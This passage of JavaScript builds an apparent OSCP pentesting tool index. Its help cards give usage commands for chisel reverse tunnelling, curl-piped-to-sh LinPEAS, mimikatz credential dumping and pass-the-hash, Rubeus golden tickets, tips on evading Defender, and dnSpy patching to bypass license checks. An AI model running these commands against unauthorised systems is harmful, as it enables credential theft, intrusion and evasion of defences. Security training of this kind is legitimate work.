                  <li>For OSCP: Often finds unquoted service paths, DLL hijacking</li>
                </ul>
              `,
              tags: ["windows", "privesc", "enum", "peass", "executable", "privilege escalation"],
              phase: "04_privilege_escalation"
            },
            {
              name: "chisel",
              desc: "Tunneling for pivoting",
              file: "chisel",
              dup: "from 01",
              detail: `
                <div style="color: #00d1b2; font-weight: 600; margin-bottom: 10px; font-size: 1.2rem;">📌 What is chisel?</div>
                <p>A fast, encrypted TCP/UDP tunnel over HTTP(S). Create SOCKS proxies or port forwards through firewalls. Essential for pivoting in internal networks.</p>
                <div style="color: #ff3860; font-weight: 600; margin: 20px 0 10px; font-size: 1.2rem;">🎯 When Do You Need It?</div>
                <ul style="margin-left: 20px; line-height: 1.6; color: #e0e0e0;">
                  <li>When you compromise a machine inside a network</li>
                  <li>To access internal services (SMB, RDP, databases)</li>
                  <li>To route tools like nmap, bloodhound, or metasploit through the pivot</li>
                </ul>
                <div style="color: #3273dc; font-weight: 600; margin: 20px 0 10px; font-size: 1.2rem;">🛠️ How to Use It</div>
                <pre style="background: #1a1a1a; padding: 15px; border-radius: 8px; overflow-x: auto; color: #ffcb6b; font-family: 'JetBrains Mono', monospace; margin: 10px 0;">
# On your attacking machine (server)
./chisel server -p 8080 --reverse
# On compromised target (client)
./chisel client YOUR_IP:8080 R:socks
# Now set proxychains
proxychains nmap -sT -Pn -n -p 80,445,3389 192.168.1.0/24
# Forward single port
./chisel client YOUR_IP:8080 R:3389:192.168.1.10:3389
                </pre>
                <div style="color: #ffdd57; font-weight: 600; margin: 20px 0 10px; font-size: 1.2rem;">💡 Pro Tips</div>
                <ul style="margin-left: 20px; line-height: 1.6; color: #e0e0e0;">
                  <li>Use <code>--auth user:pass</code> for extra security</li>
                  <li>Works over HTTP — often bypasses egress filters</li>
                  <li>For OSCP: SOCKS proxy + proxychains is your best friend</li>
                  <li>If blocked, try DNS or ICMP tunneling alternatives</li>
                </ul>
              `,
              tags: ["tunnel", "pivot", "socks", "proxy", "firewall bypass", "proxychains", "chisel"],
              phase: "04_privilege_escalation"
            }
          ]
        },
        {
          cat: "linux/",
          items: [
            {
              name: "linpeas.sh",
              desc: "All-in-one Linux enumeration script",
              file: "linpeas.sh",
              dup: "from 01",
              detail: `
                <div style="color: #00d1b2; font-weight: 600; margin-bottom: 10px; font-size: 1.2rem;">📌 What is linpeas.sh?</div>
                <p><strong>LinPEAS</strong> is the ultimate Linux privilege escalation script. It automates the discovery of misconfigurations, credentials, services, and known exploits.</p>
                <div style="color: #ff3860; font-weight: 600; margin: 20px 0 10px; font-size: 1.2rem;">🎯 When Do You Need It?</div>
                <ul style="margin-left: 20px; line-height: 1.6; color: #e0e0e0;">
                  <li>After gaining initial access to a Linux box</li>
                  <li>When you need to escalate from low-priv user to root</li>
                  <li>To find passwords, keys, tokens, or misconfigured services</li>
                </ul>
                <div style="color: #3273dc; font-weight: 600; margin: 20px 0 10px; font-size: 1.2rem;">🛠️ How to Use It</div>
                <pre style="background: #1a1a1a; padding: 15px; border-radius: 8px; overflow-x: auto; color: #ffcb6b; font-family: 'JetBrains Mono', monospace; margin: 10px 0;">
# Download and run
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
# Or upload and execute
chmod +x linpeas.sh
./linpeas.sh
# Quiet mode (less noise)
./linpeas.sh -q
# Output to file
./linpeas.sh > /tmp/linpeas.out
                </pre>
                <div style="color: #ffdd57; font-weight: 600; margin: 20px 0 10px; font-size: 1.2rem;">💡 Pro Tips</div>
                <ul style="margin-left: 20px; line-height: 1.6; color: #e0e0e0;">
                  <li>Look for <span style="color: #ff6b6b;">RED</span> and <span style="color: #ffd700;">YELLOW</span> highlights — they indicate critical findings</li>
                  <li>Check for SUID binaries, writable cron jobs, docker escape vectors</li>
                  <li>Search for passwords: <code>./linpeas.sh | grep -i "password\|pwd"</code></li>
                  <li>Use <code>-a</code> for full audit (slower but more thorough)</li>
                </ul>
              `,
              tags: ["linux", "privesc", "enum", "automation", "peass", "privilege escalation"],
              phase: "04_privilege_escalation"
            },
            {
              name: "LinEnum.sh",
              desc: "Classic Linux privilege escalation checker",
              file: "LinEnum.sh",
              detail: `
                <div style="color: #00d1b2; font-weight: 600; margin-bottom: 10px; font-size: 1.2rem;">📌 What is LinEnum.sh?</div>
                <p>Bash script for Linux privilege escalation enumeration — SUID, cron, processes, network, users.</p>
                <div style="color: #ff3860; font-weight: 600; margin: 20px 0 10px; font-size: 1.2rem;">🎯 When Do You Need It?</div>
                <ul style="margin-left: 20px; line-height: 1.6; color: #e0e0e0;">
                  <li>When linpeas is too noisy or heavy</li>
                  <li>For quick enumeration on restricted systems</li>
                  <li>When you prefer bash over complex scripts</li>
                </ul>
                <div style="color: #3273dc; font-weight: 600; margin: 20px 0 10px; font-size: 1.2rem;">🛠️ How to Use It</div>
                <pre style="background: #1a1a1a; padding: 15px; border-radius: 8px; overflow-x: auto; color: #ffcb6b; font-family: 'JetBrains Mono', monospace; margin: 10px 0;">
# Download and run
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
chmod +x LinEnum.sh
./LinEnum.sh
# Output to file
./LinEnum.sh -r report.txt -e /tmp/ -t
# Quick scan only
./LinEnum.sh -s
                </pre>
                <div style="color: #ffdd57; font-weight: 600; margin: 20px 0 10px; font-size: 1.2rem;">💡 Pro Tips</div>
                <ul style="margin-left: 20px; line-height: 1.6; color: #e0e0e0;">
                  <li>Focus on "Scan 5" — SUID files and misconfigurations</li>
                  <li>Check "Scan 7" — cron jobs and writable scripts</li>
                  <li>Look for "Scan 9" — network services and connections</li>
                  <li>For OSCP: Good alternative when linpeas is blocked</li>
                </ul>
              `,
              tags: ["linux", "privesc", "enum", "bash", "linenum", "privilege escalation"],
              phase: "04_privilege_escalation"
            }
          ]
        },
        {
          cat: "cross_platform/peas-utils",
          items: [
            {
              name: "json2pdf.py",
              desc: "Convert PEAS output to PDF",
              file: "json2pdf.py",
              detail: `
                <div style="color: #00d1b2; font-weight: 600; margin-bottom: 10px; font-size: 1.2rem;">📌 What is json2pdf.py?</div>
                <p>Converts JSON output from linpeas/winpeas into searchable, formatted PDF reports.</p>
                <div style="color: #ff3860; font-weight: 600; margin: 20px 0 10px; font-size: 1.2rem;">🎯 When Do You Need It?</div>
                <ul style="margin-left: 20px; line-height: 1.6; color: #e0e0e0;">
                  <li>For professional reporting</li>
                  <li>To document findings for clients</li>
                  <li>When you need to share results with team members</li>
                </ul>
                <div style="color: #3273dc; font-weight: 600; margin: 20px 0 10px; font-size: 1.2rem;">🛠️ How to Use It</div>
                <pre style="background: #1a1a1a; padding: 15px; border-radius: 8px; overflow-x: auto; color: #ffcb6b; font-family: 'JetBrains Mono', monospace; margin: 10px 0;">
# First, run winpeas/linpeas with JSON output
./linpeas.sh -o json > linpeas.json
# Convert to PDF
python3 json2pdf.py -f linpeas.json -o report.pdf
# For winpeas
winpeasx64.exe /quiet /json > winpeas.json
python3 json2pdf.py -f winpeas.json -o report.pdf
                </pre>
                <div style="color: #ffdd57; font-weight: 600; margin: 20px 0 10px; font-size: 1.2rem;">💡 Pro Tips</div>
                <ul style="margin-left: 20px; line-height: 1.6; color: #e0e0e0;">
                  <li>Use <code>-t</code> flag for custom template</li>
                  <li>Great for OSCP report if you want professional format</li>
                  <li>Combine with <code>grep</code> to extract only critical findings</li>
                  <li>Always keep JSON and PDF for evidence</li>
                </ul>
              `,
              tags: ["report", "pdf", "json", "peas", "documentation", "professional", "oscp report"],
              phase: "04_privilege_escalation"
            }
          ]
        }
      ]
    },
    {
      name: "05_credentials_looting — Credential Extraction",
      tools: [
        {
          cat: "Credential Dumpers",
          items: [
            {
              name: "mimikatz.exe",
              desc: "Extract passwords, hashes, tickets",
              file: "mimikatz.exe",
              dup: "also in 03 & 04",
              detail: `
                <div style="color: #00d1b2; font-weight: 600; margin-bottom: 10px; font-size: 1.2rem;">📌 What is mimikatz.exe?</div>
                <p>The legendary Windows post-exploitation tool. Extracts plaintext passwords, hashes, PINs, and Kerberos tickets from memory (LSASS). Essential for AD pentests.</p>
                <div style="color: #ff3860; font-weight: 600; margin: 20px 0 10px; font-size: 1.2rem;">🎯 When Do You Need It?</div>
                <ul style="margin-left: 20px; line-height: 1.6; color: #e0e0e0;">
                  <li>After gaining admin/system access on Windows</li>
                  <li>To dump domain credentials from Domain Controllers</li>
                  <li>To extract Kerberos tickets for Pass-the-Ticket attacks</li>
                  <li>To get plaintext passwords for lateral movement</li>
                </ul>
                <div style="color: #3273dc; font-weight: 600; margin: 20px 0 10px; font-size: 1.2rem;">🛠️ How to Use It</div>
                <pre style="background: #1a1a1a; padding: 15px; border-radius: 8px; overflow-x: auto; color: #ffcb6b; font-family: 'JetBrains Mono', monospace; margin: 10px 0;">
# Basic usage
mimikatz.exe
privilege::debug
token::elevate
sekurlsa::logonpasswords
# Dump hashes only
sekurlsa::pth /user:Administrator /domain:corp.local /ntlm:HASH_HEREs
# Export tickets
sekurlsa::tickets /export
# Pass-the-hash
sekurlsa::pth /user:admin /domain:corp /ntlm:HASH /run:cmd.exe
                </pre>
                <div style="color: #ffdd57; font-weight: 600; margin: 20px 0 10px; font-size: 1.2rem;">💡 Pro Tips</div>
                <ul style="margin-left: 20px; line-height: 1.6; color: #e0e0e0;">
                  <li>Run as Administrator — or you’ll get “ERROR kuhl_m_privilege”</li>
                  <li>Use <code>token::elevate</code> if you’re already SYSTEM</li>
                  <li>Defender blocks it — rename exe or use reflective loading</li>
                  <li>For OSCP: Focus on <code>sekurlsa::logonpasswords</code> and <code>sekurlsa::pth</code></li>
                </ul>
              `,
              tags: ["mimikatz", "credentials", "lsass", "hashes", "tickets", "pass the hash", "kerberos"],
              phase: "05_credentials_looting"
            },
            {
              name: "Rubeus.exe",
              desc: "Request & abuse Kerberos tickets",
              file: "Rubeus.exe",
              dup: "also in 03",
              detail: `
                <div style="color: #00d1b2; font-weight: 600; margin-bottom: 10px; font-size: 1.2rem;">📌 What is Rubeus.exe?</div>
                <p>C# tool for Kerberos interaction — request, abuse, and forge tickets (TGTs, TGS, Silver/Golden). </p>
                <div style="color: #ff3860; font-weight: 600; margin: 20px 0 10px; font-size: 1.2rem;">🎯 When Do You Need It?</div>
                <ul style="margin-left: 20px; line-height: 1.6; color: #e0e0e0;">
                  <li>For Kerberos attacks (Golden Ticket, Silver Ticket)</li>
                  <li>To request TGTs/TGSs for specific users</li>
                  <li>For Pass-the-Ticket attacks</li>
                </ul>
                <div style="color: #3273dc; font-weight: 600; margin: 20px 0 10px; font-size: 1.2rem;">🛠️ How to Use It</div>
                <pre style="background: #1a1a1a; padding: 15px; border-radius: 8px; overflow-x: auto; color: #ffcb6b; font-family: 'JetBrains Mono', monospace; margin: 10px 0;">
# Ask for TGT
Rubeus.exe asktgt /user:john /domain:corp.local /password:Password123!
# Dump current tickets
Rubeus.exe triage
# Pass-the-Ticket
Rubeus.exe ptt /ticket:ticket.kirbi
# Golden Ticket (need krbtgt hash)
Rubeus.exe golden /user:fakeadmin /domain:corp.local /sid:S-1-5-21-... /krbtgt:HASH_HERE
                </pre>
                <div style="color: #ffdd57; font-weight: 600; margin: 20px 0 10px; font-size: 1.2rem;">💡 Pro Tips</div>
                <ul style="margin-left: 20px; line-height: 1.6; color: #e0e0e0;">
                  <li>Use <code>asktgt</code> for legitimate TGT requests</li>
                  <li>Use <code>dump</code> to extract tickets from memory</li>
                  <li>Golden Ticket requires krbtgt account hash</li>
                  <li>For OSCP: Focus on <code>asktgt</code> and <code>ptt</code></li>
                </ul>
              `,
              tags: ["kerberos", "rubeus", "tickets", "ptt", "otp", "golden ticket", "silver ticket"],
              phase: "05_credentials_looting"
            }
          ]
        }
      ]
    },
    {
      name: "06_reverse_engineering — Binary Analysis",
      tools: [
        {
          cat: "Tools",
          items: [
            {
              name: "dnSpy/",
              desc: ".NET assembly browser, decompiler, debugger",
              file: "dnSpy.zip",
              dup: "also in 04/windows",
              detail: `
                <div style="color: #00d1b2; font-weight: 600; margin-bottom: 10px; font-size: 1.2rem;">📌 What is dnSpy?</div>
                <p>.NET assembly editor, decompiler, and debugger. Lets you modify and recompile .NET binaries.</p>
                <div style="color: #ff3860; font-weight: 600; margin: 20px 0 10px; font-size: 1.2rem;">🎯 When Do You Need It?</div>
                <ul style="margin-left: 20px; line-height: 1.6; color: #e0e0e0;">
                  <li>When analyzing .NET applications</li>
                  <li>To bypass license checks or authentication</li>
                  <li>To understand how malware works</li>
                  <li>To modify and recompile binaries</li>
                </ul>
                <div style="color: #3273dc; font-weight: 600; margin: 20px 0 10px; font-size: 1.2rem;">🛠️ How to Use It</div>
                <pre style="background: #1a1a1a; padding: 15px; border-radius: 8px; overflow-x: auto; color: #ffcb6b; font-family: 'JetBrains Mono', monospace; margin: 10px 0;">
# Open dnSpy.exe
# File > Open > Select .exe or .dll
# Browse code in decompiler view
# Set breakpoints in debugger
# Modify code
# Right-click method > Edit IL Instructions
# Save modified assembly
# File > Save Module
                </pre>
                <div style="color: #ffdd57; font-weight: 600; margin: 20px 0 10px; font-size: 1.2rem;">💡 Pro Tips</div>
                <ul style="margin-left: 20px; line-height: 1.6; color: #e0e0e0;">
                  <li>Look for <code>if</code> statements checking licenses or passwords</li>
                  <li>Modify IL code to skip validation (change <code>brfalse</code> to <code>brtrue</code>)</li>
                  <li>Use debugger to find hardcoded credentials</li>
                  <li>For OSCP: Useful for binary exploitation challenges</li>
                </ul>
              `,
              tags: ["reverse engineering", "dotnet", "decompile", "debug", "dnspy", ".net", "binary analysis"],
              phase: "06_reverse_engineering"
            }
          ]
        }
      ]
    }
  ];
  /* ----------   RENDER UI   ---------- */
  function render() {
    container.innerHTML = '';
    data.forEach(phase => {
      const phaseEl = document.createElement('div');
      phaseEl.className = 'phase';
      if (phase.name.includes("01_recon_enum")) {
        phaseEl.classList.add('open');
      }
      phaseEl.innerHTML = `
        <div class="phase-header">${escapeHtml(phase.name)}</div>
        <div class="phase-content"></div>
      `;
      const phaseContent = phaseEl.querySelector('.phase-content');
      phase.tools.forEach(cat => {
        const catEl = document.createElement('div');
        catEl.className = 'category';
        if (cat.cat === "wordlists/" && phase.name.includes("01_recon_enum")) {
          catEl.classList.add('open');
        }
        catEl.innerHTML = `
          <div class="category-header">${escapeHtml(cat.cat)}</div>
          <div class="category-content"></div>
        `;
        const catContent = catEl.querySelector('.category-content');
        let toolsHtml = '';
        cat.items.forEach(tool => {
          const toolId = toolIdCounter++;
          toolLookup[toolId] = tool;
          toolsHtml += `
            <div class="tool">
              <div class="tool-info">
                <div>
                  <span class="tool-name">${escapeHtml(tool.name)}</span>
                  ${tool.dup ? `<span class="dup">↔ ${escapeHtml(tool.dup)}</span>` : ''}
                </div>
                <div class="desc">${escapeHtml(tool.desc)}</div>
              </div>
              <div class="tool-actions">
                <button class="btn" onclick="showInfo(${toolId})">ℹ️ Info</button>
                <button class="btn" onclick="downloadTool('${escapeHtml(tool.file)}')">⬇️ Download</button>
              </div>
            </div>
          `;
        });
        catContent.innerHTML = toolsHtml;
        catEl.querySelector('.category-header').addEventListener('click', function(e) {
          e.stopPropagation();
          catEl.classList.toggle('open');
        });
        phaseContent.appendChild(catEl);
      });
      phaseEl.querySelector('.phase-header').addEventListener('click', function() {
        phaseEl.classList.toggle('open');
      });
      container.appendChild(phaseEl);
    });
  }
  /* ----------   LOADING / DISPLAY   ---------- */
  setTimeout(() => {
    loader.style.opacity = '0';
    loader.style.transition = 'opacity 0.5s ease';
    setTimeout(() => {
      loader.style.display = 'none';
      app.style.display = 'block';
      render();
    }, 500);
  }, 1500);

  /* ----------   GITHUB FLOATING FOOTER   ---------- */
  // Create the GitHub footer element
  const githubFooter = document.createElement('a');
  githubFooter.href = 'https://github.com/xcode96'; // ⚠️ REPLACE THIS WITH YOUR ACTUAL GITHUB URL
  githubFooter.target = '_blank';
  githubFooter.rel = 'noopener noreferrer';
  githubFooter.className = 'github-footer';
  githubFooter.innerHTML = `
    <svg viewBox="0 0 24 24" width="24" height="24" fill="currentColor">
      <path d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"/>
    </svg>
  `;

  // Add minimal CSS for the footer
  const style = document.createElement('style');
  style.textContent = `
    .github-footer {
      position: fixed;
      bottom: 20px;
      right: 20px;
      background-color: #24292e;
      color: white;
      width: 40px;
      height: 40px;
      border-radius: 50%;
      display: flex;
      justify-content: center;
      align-items: center;
      text-decoration: none;
      box-shadow: 0 2px 10px rgba(0,0,0,0.3);
      transition: transform 0.2s ease, box-shadow 0.2s ease;
      z-index: 1000;
    }
    .github-footer:hover {
      transform: scale(1.1);
      box-shadow: 0 4px 15px rgba(0,0,0,0.4);
    }
    .github-footer svg {
      width: 24px;
      height: 24px;
    }
    /* Ensure it doesn't interfere with mobile view */
    @media (max-width: 768px) {
      .github-footer {
        bottom: 15px;
        right: 15px;
        width: 36px;
        height: 36px;
      }
    }
  `;
  document.head.appendChild(style);

  // Append the footer to the body
  document.body.appendChild(githubFooter);
});
